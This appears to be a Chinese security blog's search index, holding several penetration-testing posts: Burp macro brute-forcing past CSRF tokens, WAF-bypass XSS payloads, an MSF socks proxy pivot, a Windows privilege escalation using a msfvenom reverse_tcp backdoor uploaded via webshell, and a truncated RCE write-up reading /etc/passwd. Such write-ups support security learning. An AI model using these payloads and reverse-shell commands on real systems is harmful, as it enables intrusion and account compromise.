      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用BurpSuite宏获取CSRF TOKEN</title>
    <url>/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在WEB渗透中经常可以看到页面存在一次性<code>token</code>校验的情况，即请求包中包含<code>token</code>，而<code>token</code>值需通过其它页面获取，导致<code>burpsuite</code>抓包后无法重放。</p>
<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>下面以一个简单例子来做个说明。目标网站如下，页面存在一个图片验证码，题目要求暴力破解得到账号密码。这题可以有多种方式实现，这里以<code>burpsuite</code>宏进行实验。<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-55-39.png"></p>
<a id="more"></a>
<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
<li>目标URL为：<code>http://1.1.1.1/c/hdyzma/welcome.php</code>，抓个包测试一下，发现其会对<code>token</code>参数校验，拒绝重放的数据包。<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-17.png"><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-24.png"></li>
<li>在登陆页面<code>http://1.1.1.1/c/hdyzma/</code>可发现<code>token</code>值：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-48.png"></li>
<li>通过上面的发现，可以使用<code>burpsuite</code>的宏功能自动把登陆页的<code>token</code>值抓取出来填入登陆请求</li>
</ol>
<h3 id="创建Macros"><a href="#创建Macros" class="headerlink" title="创建Macros"></a>创建Macros</h3><ol>
<li>创建<code>Macros</code>，获取<code>token</code>值<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-57-29.png"></li>
<li>在<code>Macro Recorder</code>中选择包含要获取的<code>token</code>的页面<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-57-54.png"></li>
<li>配置<code>Macros</code><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-58-16.png"><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-58-23.png"><br>用鼠标选中<code>token</code>值，<code>burpsuite</code>会自动填写开始标记以及结束标记，并且写上<code>Parameter name</code>为<code>token</code>，注意这里的参数名<code>token</code>是与要爆破页面里的<code>token</code>名称一致：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-59-07.png"><br>定义<code>Macro</code>描述，方便区分：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-59-30.png"></li>
</ol>
<h3 id="创建Session-Handling-Rules"><a href="#创建Session-Handling-Rules" class="headerlink" title="创建Session Handling Rules"></a>创建Session Handling Rules</h3><ol>
<li><p>然后在Session Handling Rules里面新建一条规则：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-00-45.png"><br>设置一个名字，这里叫<code>update_token</code>：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-02.png"><br>选中刚刚录制好的宏，并且设置要更新的参数名，这里是<code>token</code>：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-19.png"></p>
</li>
<li><p>然后是设置宏的影响范围，因为我们只需要暴力破解账号密码，所以<code>Tools Scope</code>这里只选中<code>Repeater</code>、<code>Intruder</code>就行了，其它模块可根据实际需要勾选:<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-52.png"></p>
</li>
</ol>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ol>
<li>回到<code>Repeater</code>，点击<code>Go</code>重新发包，可以看到现在<code>token</code>参数会自动刷新：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-29.png"><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-36.png"></li>
<li>使用<code>Intruder</code>暴力破解账号密码：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-54.png"><br>因为多线程会同时刷新<code>token</code>，导致部分请求包拿到的<code>token</code>已经被刷新了，所以只能设置单线程跑：<br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-03-17.png"><br>成功暴破得到账号<code>admin/123456a</code><br><img data-src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-03-32.png"></li>
</ol>
<h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>源码来自<a href="https://github.com/3sNwgeek">3sNwgeek</a>，附上题目：<a href="https://github.com/3sNwgeek/BruteForc_test">https://github.com/3sNwgeek/BruteForc_test</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>一些过WAF的PAYLOAD</title>
    <url>/2019/07/22/%E4%B8%80%E4%BA%9B%E8%BF%87WAF%E7%9A%84PAYLOAD/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这是是一些个人构造或者收集而来的成功绕过waf的payload，持续更新。</p>
<h3 id="XSS-PAYLOAD"><a href="#XSS-PAYLOAD" class="headerlink" title="XSS PAYLOAD"></a>XSS PAYLOAD</h3><ol>
<li>某waf拦截<code>=alert</code>、<code>=eval</code>等，却不拦截<code>=console.log</code><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=<span class="built_in">console</span>.log(<span class="built_in">eval</span>(atob(<span class="string">&#x27;YWxlcnQoJ3hzcycp&#x27;</span>)))&gt;</span><br></pre></td></tr></table></figure></li>
<li>匹配<code>&lt;&gt;</code>中间不能有<code>=onload</code>等任意javascript事件，内容只匹配一次，第一个<code>&lt;</code>与<code>%3e</code>匹配了，第二个<code>&lt;</code>与最后的<code>&gt;</code>匹配了，所以第一个<code>&lt;</code>与最后的<code>&gt;</code>中间的<code>onload=</code>没有被拦截<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg admin=<span class="string">&#x27;&lt;%00%3e&#x27;</span> onload=alert<span class="string">`xss`</span>&gt;</span><br></pre></td></tr></table></figure></li>
<li>js关键字拼接绕过，把alert函数赋值到变量，通过变量调用，可绕过函数名的拦截<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ex1:</span><br><span class="line">&lt;svg onload=<span class="string">&quot;var a=alert;console.log(a(1))&quot;</span>&gt;&lt;/svg&gt;</span><br><span class="line">ex2:</span><br><span class="line"><span class="number">11111111</span><span class="string">&quot;&gt;&lt;svg+onload=&quot;</span><span class="keyword">var</span>+a=alert;a(<span class="number">1</span>)<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>无事件和js代码xss<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>kali iptables 配置自启动加载</title>
    <url>/2020/08/21/kali-iptables-%E9%85%8D%E7%BD%AE%E8%87%AA%E5%90%AF%E5%8A%A8%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h3 id="创建启动配置文件"><a href="#创建启动配置文件" class="headerlink" title="创建启动配置文件"></a>创建启动配置文件</h3><p>编辑创建以下文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/network/<span class="keyword">if</span>-pre-up.d/iptables</span><br></pre></td></tr></table></figure>
<p>粘贴下面内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">/sbin/iptables-restore &lt; /etc/iptables/rules.v4</span><br></pre></td></tr></table></figure>
<p>添加执行权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x /etc/network/<span class="keyword">if</span>-pre-up.d/iptables</span><br></pre></td></tr></table></figure>
<p>通过下面命令保存iptables：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-save &gt; /etc/iptables/rules.v4</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>当SQL注入遇到诡异的编码问题</title>
    <url>/2019/09/12/%E5%BD%93SQL%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E8%AF%A1%E5%BC%82%E7%9A%84%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>分享一个特殊的SQL注入案例，某处SQL注入因WEB系统数据库连接编码与实际的数据库编码不一致，并且数据库表字段名使用了中文的字段名，导致通过正常手段无法获取到数据库数据，文章已在Freebuf发布。<a href="https://www.freebuf.com/articles/web/213142.html">Freebuf原文</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>同步GitHub Page博客到Gitee</title>
    <url>/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/</url>
    <content><![CDATA[<h3 id="Gitee-Page"><a href="#Gitee-Page" class="headerlink" title="Gitee Page"></a>Gitee Page</h3><p>码云 Pages是一个免费的静态网页托管服务，您可以使用 码云 Pages 托管博客、项目官网等静态网页。如果您使用过 Github Pages 那么您会很快上手使用码云的 Pages服务。<br>相对 Github Pages 来说，码云 Gitee Pages在国内访问会快很多。使用简单的方法就能让 Gitee Page 同步 Github Pages。</p>
<a id="more"></a>
<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><p>在首页，选择新建仓库<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-52-22.png"><br>选择导入已有仓库，并修改仓库名称和路径为Gitee的用户名，因为我已经导入过了，所以这里显示重复<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-53-47.png"><br>导入后是这样子的<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-00.png"><br>在服务中启动Gitee Pages<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-24.png"><br>检查用户名和url是否对应，然后点击更新<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-53.png"><br>更新后即可通过页面的url访问到博客。</p>
<h3 id="GitHub-Page更新"><a href="#GitHub-Page更新" class="headerlink" title="GitHub Page更新"></a>GitHub Page更新</h3><p>如果GitHub Page更新了，可以点击码云的同步按钮同步博客内容：<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-17-04-38.png"></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>让BurpSuite使用MSF的socks4a代理</title>
    <url>/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在使用msf转发流量时遇到了个问题，就是使用auxiliary/server/socks4a做代理时，burpsuite不支持socks4a代理，导致无法使用burp去抓包。而使用auxiliary/server/socks5做代理却失败了，可能是脚本的bug，官方issues也有人反馈这个问题。</p>
<h3 id="具体问题"><a href="#具体问题" class="headerlink" title="具体问题"></a>具体问题</h3><h4 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h4><p>我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-43-50.png"></p>
<a id="more"></a>
<h4 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h4><ol>
<li>在MSF机器启动socks4a代理（前面获取反弹shell、设置路由的步骤略过）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; use auxiliary&#x2F;server&#x2F;socks4a </span><br><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; set SRVPORT 11080</span><br><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; exploit</span><br></pre></td></tr></table></figure>
<img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-44-36.png"></li>
<li>在配置代理前，我的ip地址是A地公网ip<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-44-49.png"></li>
<li>使用Firefox配置代理测试转发是否正常，这时ip由联通变成电信了，证明代理转发隧道工作正常<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-05.png"><br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-14.png"></li>
<li>这个时候，如果直接在burpsuite配置前置socks代理的话是不能使用的，因为burpsuite不支持socks4协议，所以会打不开网页<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-33.png"></li>
</ol>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>使用sockscap64工具，把socks4a转发为http代理。当然，使用其它工具将socks4a转为http代理或socks5代理也行，比如Linux下的privoxy，socks4a转socks5的工具找了很久都没找到，遂放弃。</p>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>打开sockscap64工具，创建代理配置，代理服务器为127.0.0.1:1083（MSF socks4a端口地址）<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-34.png"><br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-39.png"><br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-47.png"></li>
<li>burpsuite配置前置http代理，代理服务地址为127.0.0.1:25378，这个端口是sockscap64监听的端口<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-08.png"><br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-15.png"></li>
<li>打开Firefox测试，可以看到现在已经是MSF机器的电信ip了，问题成功解决。<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-29.png"></li>
<li>回顾下出口流量走向，如下：<div id="flowchart-0" class="flow-chart"></div>

</li>
</ol>
<h4 id="为什么是25378端口"><a href="#为什么是25378端口" class="headerlink" title="为什么是25378端口"></a>为什么是25378端口</h4><ol>
<li>SockScap64支持系统代理<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-50-11.png"></li>
<li>启用系统代理可发现其使用25378端口做代理服务<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-50-27.png"><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 工作机Firefox
e=>end: 目标网络
op1=>operation: burp代理（127.0.0.1:1080)
op2=>operation: SocksCap64本地代理（127.0.0.1:25378)
op3=>operation: ssh本地转发端口（127.0.0.1:1083)
op4=>operation: msf socks4a端口（172.16.1.2:11083）
st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script></li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次Windows提权过程</title>
    <url>/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-10-21.png"></p>
<h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </span><br></pre></td></tr></table></figure>

<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST x.x.x.x  </span><br><span class="line">set LPORT xx  </span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="通过webshell上传并执行木马"><a href="#通过webshell上传并执行木马" class="headerlink" title="通过webshell上传并执行木马"></a>通过webshell上传并执行木马</h3><p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-11-37.png"></p>
<h3 id="msf接收到会话"><a href="#msf接收到会话" class="headerlink" title="msf接收到会话"></a>msf接收到会话</h3><p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-12-59.png"></p>
<h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid  </span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-14-15.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito   </span><br><span class="line">list_tokens -u  </span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-19-47.png"></p>
<h3 id="查找可利用的提权exp"><a href="#查找可利用的提权exp" class="headerlink" title="查找可利用的提权exp"></a>查找可利用的提权exp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester  </span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-11.png"></p>
<h3 id="把当前msf回话放到后台，并记住其session值为5"><a href="#把当前msf回话放到后台，并记住其session值为5" class="headerlink" title="把当前msf回话放到后台，并记住其session值为5"></a>把当前msf回话放到后台，并记住其session值为5</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bg  </span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-36.png"></p>
<h3 id="利用ms16-075得到system权限"><a href="#利用ms16-075得到system权限" class="headerlink" title="利用ms16_075得到system权限"></a>利用ms16_075得到system权限</h3><p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-50.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次远程命令执行漏洞的挖掘过程</title>
    <url>/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong><br>本文已在Freebuf发布，但文章经Freebuf编辑改动导致有小部分错误，故在这里改正并重新发布。<br><em>原文链接： <a href="https://www.freebuf.com/vuls/185380.html">https://www.freebuf.com/vuls/185380.html</a></em></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近为甲方做渗透测试发现了一个远程命令执行漏洞，可以通过构造恶意参数传递执行bash命令，本文回顾一下漏洞的挖掘过程。</p>
<a id="more"></a>
<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
<li>通过<code>nessus</code>扫描器的<code>Sitemap</code>模块，发现了可疑目录：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-26.png"></li>
<li>根据<code>sitemap</code>的目录信息，打开URL:<code>http://x.x.x.x:28076/file/</code>，发现存在未授权访问漏洞：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-57.png"></li>
<li>逐个查看里面的文件，找到了一些比较有意思的JSP：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-27-22.png"></li>
<li>蒙了一下<code>dirFiles.jsp</code>的参数，发现使用<code>path</code>作为参数名可列出目录、文件信息，URL：<code>http://x.x.x.x:28076/file/dirFiles.jsp?path=.</code><br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-28-24.png"></li>
<li>同样的方法，发现<code>show.jsp</code>存在任意文件读取漏洞，URL：<code>http://x.x.x.x:28076/file/show.jsp?path=/etc/passwd</code><br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-29-00.png"></li>
<li>结合上面的目录信息和任意文件读取漏洞，对JSP文件简单审计一下，发现<code>logContentNewest.jsp</code>会调用一个<code>bash</code>脚本，便猜想能否使用它构造命令执行：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-29-32.png"></li>
</ol>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ol>
<li><code>logContentNewest.jsp</code>正常执行是这样的，可自定义<code>path</code>参数的值，如<code>/etc/passwd</code>，来查找这个文件里面的内容：<br><img data-src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-30-15.png"></li>
